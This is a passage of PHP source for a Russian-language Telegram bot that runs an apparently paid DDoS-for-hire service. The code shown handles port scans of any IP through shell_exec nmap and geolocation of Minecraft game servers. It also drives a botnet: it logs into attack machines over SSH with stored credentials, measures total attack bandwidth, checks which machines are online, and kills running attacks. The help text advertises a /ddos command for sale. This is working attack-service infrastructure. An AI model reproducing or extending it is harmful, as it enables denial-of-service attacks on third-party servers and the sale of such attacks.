                "-sT", "-sF", "-sX", "-sN",
                "-sP", "-sV", "-sU", "-sA",
                "-sW", "-sR", "-P0", "-PT",
                "-PS", "-PB", "-O", "-F",
                "-n", "-R", "-r", "-Pn",

            );

            if ($message[1] == null || $message[1] == " ") {

                $bot->reply($chat, $get_config['tag'] . " - Нельзя айпи адрес оставлять пустым,\n\n{!} Пример :: /nmap 1.0.0.1");

                return true;

            }

            if (!(filter_var($message[1], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))) {

                $bot->reply($chat, $get_config['tag'] . " - Не удалось обработать айпи адрес");

                return true;

            }

            $ch = curl_init("https://ipwho.is/" . $message[1]);

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);

            $get_json = curl_exec($ch);

            curl_close($ch);

            $decoded_data = json_decode($get_json, true);

            if (!($decoded_data['success'])) {

                $bot->reply($chat, $get_config['tag'] . " - Данный айпи адрес недоступен.");

                return true;

            }

            $key = isset($message[2]) && !empty($message[2]) ? $message[2] : "-Pn";

            if (!(in_array($key, $array_key))) {

                $bot->reply($chat, $get_config['tag'] . " - Данный ключ не найден или не разрешен.");

                return true;

            }

            $time_s = 10;
            $countdown = $time_s;

            $get_message = $bot->reply($chat, $get_config['tag'] . " - Ожидайте " . $time_s . " секунд. Идёт сканирование.");

            $get_message_id = $get_message['result']['message_id'];

            $start = microtime(true);

            $output = shell_exec("timeout " . $time_s . " nmap " . $key . " " . $message[1] . "; exit");

            while ($countdown > 0) {

                $data = [

                    'chat_id' => $chat,
                    'message_id' => $get_message_id,
                    'text' => $get_config['tag'] . " - Ожидайте " . $countdown - 1 . " секунд. Идёт сканирование.",

                ];

                $ch = curl_init('https://api.telegram.org/bot' . $get_config['token'] . '/editMessageText');

                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

                $response = curl_exec($ch);

                curl_close($ch);

                $countdown--;

            }

            $end = microtime(true);

            $diff = $end - $start;

            $cleanOutput = preg_replace("/^[^\n]+\n/", "", $output);

            if (!empty($cleanOutput)) {

                $flag = isset($decoded_data['flag']['emoji']) && !empty($decoded_data['flag']['emoji']) ? $decoded_data['flag']['emoji'] : "Не найдена";

                $country = isset($decoded_data['country']) && !empty($decoded_data['country']) ? $decoded_data['country'] : "Не найдена";

                $isp = isset($decoded_data['connection']['isp']) && !empty($decoded_data['connection']['isp']) ? $decoded_data['connection']['isp'] : "Не найдена";

                $bot->reply($chat, "(+) - Информация:\n\nАйпи адрес: " . $message[1] . "\nКлюч запроса: " . $key . "\nСтрана: " . $country . " (" . $flag . ")" . "\nПровайдер: " . $isp . "\nЗадержка: " . $diff . "\n\nВсе открыте порты:\n<pre>{$cleanOutput}</pre>\nСписок разрешенных ключей:\n<pre>-sT, -sF, -sX, -sN, -sP, -sV, -sU, -sA, -sW, -sR, -P0,\n-PT, -PS, -PB, -O, -F, -n, -R, -r, -Pn.</pre>");

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Не удалось обнаружить открытые порты.");

            }

            unset($output);

            exit();

            return false;

        } else if (preg_match("/[!\/\?]whois/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            if ($message[1] == null and $message[1] == "") {

                $bot->sendMessageButtonURL($chat, $get_config['tag'] . " - Нельзя домен оставлять пустым,\n\n{!} Пример :: /whois mc.hypixel.net.", "😈 Узнать историю домена", $get_config['help_url']);

                return true;

            }

            $ch = curl_init("https://api.mcsrvstat.us/3/" . strtolower($message[1]));

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);

            $get_mc = curl_exec($ch);

            curl_close($ch);

            $ip = json_decode($get_mc, true)['ip'];
            $port = json_decode($get_mc, true)['port'];

            if (!(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))) {

                $bot->reply($chat, $get_config['tag'] . " - Не удалось обработать айпи адрес.");

                return false;

            }

            if ($port == 25565) {

                $ipWithPort = $ip;

            } else {

                $ipWithPort = $ip . ":" . $port;

            }

            $ch = curl_init("https://ipwho.is/" . $ip);

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);

            $get_json = curl_exec($ch);

            curl_close($ch);

            $decoded_data = json_decode($get_json, true);

            $isp = isset($decoded_data['connection']['isp']) && !empty($decoded_data['connection']['isp']) ? $decoded_data['connection']['isp'] : "Не найдена";
            $org = isset($decoded_data['connection']['org']) && !empty($decoded_data['connection']['org']) ? $decoded_data['connection']['org'] : "Не найдена";
            $asn = isset($decoded_data['connection']['asn']) && !empty($decoded_data['connection']['asn']) ? $decoded_data['connection']['asn'] : "Не найдена";

            $city = isset($decoded_data['city']) && !empty($decoded_data['city']) ? $decoded_data['city'] : "Не найдена";
            $country = isset($decoded_data['country']) && !empty($decoded_data['country']) ? $decoded_data['country'] : "Не найдена";
            $countryCode = isset($decoded_data['country_code']) && !empty($decoded_data['country_code']) ? $decoded_data['country_code'] : "Не найдена";

            $timezone = isset($decoded_data['timezone']['id']) && !empty($decoded_data['timezone']['id']) ? $decoded_data['timezone']['id'] : "Не найдена";
            $timezone_abbr = isset($decoded_data['timezone']['abbr']) && !empty($decoded_data['timezone']['abbr']) ? $decoded_data['timezone']['abbr'] : "Не найдена";
            $regionName = isset($decoded_data['region']) && !empty($decoded_data['region']) ? $decoded_data['region'] : "Не найдена";
            
            $domain_provider = isset($decoded_data['connection']['domain']) && !empty($decoded_data['connection']['domain']) ? $decoded_data['connection']['domain'] : "Не найдена";

            $flag =  isset($decoded_data['flag']['emoji']) && !empty($decoded_data['flag']['emoji']) ? $decoded_data['flag']['emoji'] : "Не найдена";

            $bot->sendPhotoMessageButtonURL($chat, $get_config['tag'] . " - Информация:\n\n - Айпи: " . $ipWithPort . "\n - Город: " . $city . "\n - Регион: " . $regionName . "\n - Страна: " . $country . " (" . $flag . ")" . "\n - Провайдер: " . $isp . "\n - Организация: " . $org . "\n - Часовой пояс: " . $timezone . " " . $timezone_abbr . "\n" . " - Код страны: " . $countryCode . "\n - ASN запись: " . $asn . "\n - Сайт провайдера: " . $domain_provider, "⚙ Помощник", $get_config['help_url'], "https://i.ibb.co/yPYVrg2/Frame-22.png");

            return true;

        } else if (preg_match("/[!\/\?]network/", strtolower($message[0]))) {

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (empty($get_botnet)) {

                $bot->reply($chat, $get_config['tag'] . " - Список машин пустой добавьте машину,\n\n{!} Пример :: /botnet add.");

                return false;

            }

            foreach ($get_botnet as $key => $value) {

                $connection = ssh2_connect(onDecode($value['ip'], $get_config['key'], "AES-128-CBC"), onDecode($value['port'], $get_config['key'], "AES-128-CBC"));

                $auth = ssh2_auth_password($connection, onDecode($value['login'], $get_config['key'], "AES-128-CBC"), onDecode($value['password'], $get_config['key'], "AES-128-CBC"));

                $interface = ssh2_exec($connection, "ip route show default | awk '/default/ {print $5}'");

                stream_set_blocking($interface, true);

                $get_interface = trim(stream_get_contents($interface));

                $rxPacketsInitial = ssh2_exec($connection, "cat /sys/class/net/$get_interface/statistics/tx_bytes");

                stream_set_blocking($rxPacketsInitial, true);

                sleep(1);

                $get_rxPacketsInitial = stream_get_contents($rxPacketsInitial);

                $rxPacketsFinal = ssh2_exec($connection, "cat /sys/class/net/$get_interface/statistics/tx_bytes");

                stream_set_blocking($rxPacketsFinal, true);

                $get_rxPacketsFinal = stream_get_contents($rxPacketsFinal);

                $packetsPerSecond = $get_rxPacketsFinal - $get_rxPacketsInitial;

                $bytes = intval($packetsPerSecond);
                $trafficInGigabits = number_format($bytes / 1024 / 1024 / 1024 * 8, 2);

                $name_servers[] = $key;
                $get_traffic = addTraffic($trafficInGigabits);

                if (empty($get_traffic)) {

                    $bot->reply($chat, $get_config['tag'] . " - Не найдено не одной запущеной атаки.");

                    return true;

                }

                $count_vds = count($get_botnet);

            }

            $bot->reply($chat, $get_config['tag'] . " - Мощность атаки:\n\n - Используется " . $count_vds . " машин(ы),\n - Мощность атаки " . $get_traffic . " гигабит в секунду.\n\nТут суммируется вся мощность ботнета.");

            exit();

            return true;

        } else if (preg_match("/[!\/\?]status/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            $available_servers = [];
            $unavailable_servers = [];

            if (empty($get_botnet)) {

                $bot->reply($chat, $get_config['tag'] . " - Список машин пустой добавьте машину,\n\n{!} Пример :: /botnet add.");

                return false;

            }

            foreach ($get_botnet as $key => $value) {

                $ip = onDecode($value['ip'], $get_config['key'], "AES-128-CBC");
                $port = onDecode($value['port'], $get_config['key'], "AES-128-CBC");

                $socket = @stream_socket_client("tcp://$ip:$port", $errno, $errstr, 1);

                if ($socket) {

                    $available_servers[] = $key;

                    fclose($socket);

                } else {

                    $unavailable_servers[] = $key;

                }

            }

            $status_message = $get_config['tag'] . " - Статус серверов:\n\n";

            if (empty($unavailable_servers)) {

                $status_message .= "✅ - " . implode(" :: сервер онлайн,\n✅ - ", $available_servers) . " :: сервер онлайн.\n\nВсе сервера доступны.";

            } else if (empty($available_servers)) {

                $status_message .= "❌ - " . implode(" :: сервер оффлайн,\n❌ - ", $unavailable_servers) . " :: сервер оффлайн.\n\nВсе сервера не отвечают.";

            } else {

                $status_message .= "✅ - " . implode(" :: сервер онлайн,\n✅ - ", $available_servers) . " :: сервер онлайн,\n";
                $status_message .= "❌ - " . implode(" :: сервер оффлайн,\n❌ - ", $unavailable_servers) . " :: сервер оффлайн.\n\nНекоторые сервера не отвечают.";

            }

            $bot->reply($chat, $status_message);

            return false;

        } else if (preg_match("/[!\/\?]stop/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            if (empty($get_botnet)) {

                $bot->reply($chat, $get_config['tag'] . " - Список машин пустой добавьте машину,\n\n{!} Пример :: /botnet add.");

                return false;

            }

            foreach ($get_botnet as $key => $value) {

                $connection = ssh2_connect(onDecode($value['ip'], $get_config['key'], "AES-128-CBC"), onDecode($value['port'], $get_config['key'], "AES-128-CBC"));

                $auth = ssh2_auth_password($connection, onDecode($value['login'], $get_config['key'], "AES-128-CBC"), onDecode($value['password'], $get_config['key'], "AES-128-CBC"));

                $screen_list = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}'");

                stream_set_blocking($screen_list, true);

                $screen_pid = stream_get_contents($screen_list);

                if (empty($screen_pid)) {

                    $bot->reply($chat, $get_config['tag'] . " - Не найдена запущеной атаки.");

                    $bot->sticker($chat, "CAACAgIAAxkBAAEF2IZmW_49O0xAU7-fnUi7DrGa4lzaswACyQADVp29Cn6_0ihpPUciNQQ");

                    return false;

                }

                $stream = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}' | xargs kill");

            }

            if ($stream) {

                $bot->reply($chat, $get_config['tag'] . " - DDoS атака успешно остановлена.");

                $bot->sticker($chat, "CAACAgIAAxkBAAEF2IRmW_4YARVrt7FEOF4uynUPAoOVIgAC5gADVp29CgABASgoWjZr-zUE");

                fclose($stream);

                return true;

            } else if (!$auth) {

                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен.", "https://i.ibb.co/gvQLVKz/error.png");

                return false;

            } else if (!$connection) {

                $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось установить соединение с сервером.", "https://i.ibb.co/gvQLVKz/error.png");

                return false;

            }

            ssh2_disconnect($connection);

            return true;

        } else if (preg_match("/[!\/\?]token/", strtolower($message[0]))) {

            $bot->reply($chat, $get_config['tag'] . " - Команда выполняется ожидайте.");

            if (!(array_key_exists($id, $get_users))) {

                $bot->sendButtonWebApp($chat, $get_config['tag'] . " - Для использования бота необходимо приобрести доступ к боту.", $get_config['url'], "🌍 Купить доступ к боту");

                return true;

            }

            if (strtolower($message[1]) == "get") {

                if (array_key_exists($id, $get_users)) {

                    $value = $get_users[$id];

                    $bot->reply($chat, $get_config['tag'] . " - Ваш токен:\n\n - <tg-spoiler>" . $id . " -> " . $value['token'] . "</tg-spoiler>\n\nНе передавайте данный токен не кому.");

                    return true;

                } else {

                    $bot->pictureReply($chat, $get_config['tag'] . " - Не удалось получить ваш токен.", "https://i.ibb.co/gvQLVKz/error.png");

                    return false;

                }

            } else if (strtolower($message[1]) == "reset") {

                $newUsers = [];

                foreach ($get_users as $userId => $user) {

                    if ($userId == $id) {

                        $token = gen_token(16);

                        $user['token'] = $token;

                    }

                    $newUsers[$userId] = $user;

                }

                $newJsonData = json_encode($newUsers, JSON_PRETTY_PRINT);

                file_put_contents(__DIR__ . "/API/json/" . $get_config['users_file'], $newJsonData);

                $bot->reply($chat, $get_config['tag'] . " - Token успешно изменён:\n\n - <tg-spoiler>" . $token . "</tg-spoiler>\n\nНе передавайте данный токен не кому.");

                return true;

            } else {

                $bot->reply($chat, $get_config['tag'] . " - Неправильный аргумент используйте,\n\n{!} Пример :: /token (get/reset).");

                return false;

            }

        } else if (preg_match("/[!\/\?]help|start/", strtolower($message[0]))) {

            if (strtolower($message[1]) == "admin") {

                if (in_array($id, $get_config['admin_ids'])) {

                    $bot->reply($chat, "(+) Админ команды:\n\n - Черный список айпи адресов :: /wlip (add/del/list),\n - Управления машинами :: /botnet (add/del/edit/restart),\n - Управления пользователями :: /user (add/del/list).\n\nИспользование команд строго для администраций.");

                    return true;

                } else {

                    $bot->reply($chat, $get_config['tag'] . " - Данная команда доступна только для администраторов.");

                    return false;

                }

            } else {

                if (!(array_key_exists($id, $get_users))) {

                    $subscription = "🤔 Разработчик";

                } else {

                    foreach ($get_users as $key => $value) {

                        if ($key == $id) {

                            $subscription = "🫠 Подписка до " . str_replace("-", ".", $value['date']);

                        }

                    }

                }

                $bot->sendPhotoMessageButtonURL($chat, "(+) Команды бота:\n\n - Начать ддос атаку :: /ddos.\n - Остановить ддос атаку :: /stop,\n - Узнать ваш айди :: /getid,\n - Статус серверов :: /status,\n - Узнать все методы атак :: /methods,\n - Работа с токеном :: /token,\n - Узнать мощность атаки :: /network,\n - Узнать информацию о домене :: /whois,\n - Сканирование портов :: /nmap.\n\nПример :: /ddos 1.1.1.1 25565 UDP 300", $subscription, $get_config['tg'], "https://i.ibb.co/zQGvBJ0/bot-help.png");

                return true;

            }

        } else {

            $bot->reply($chat, $get_config['tag'] . " - Неизвестная команда используйте - /help.");

            return false;

        }

    }

    exit('ok');

?>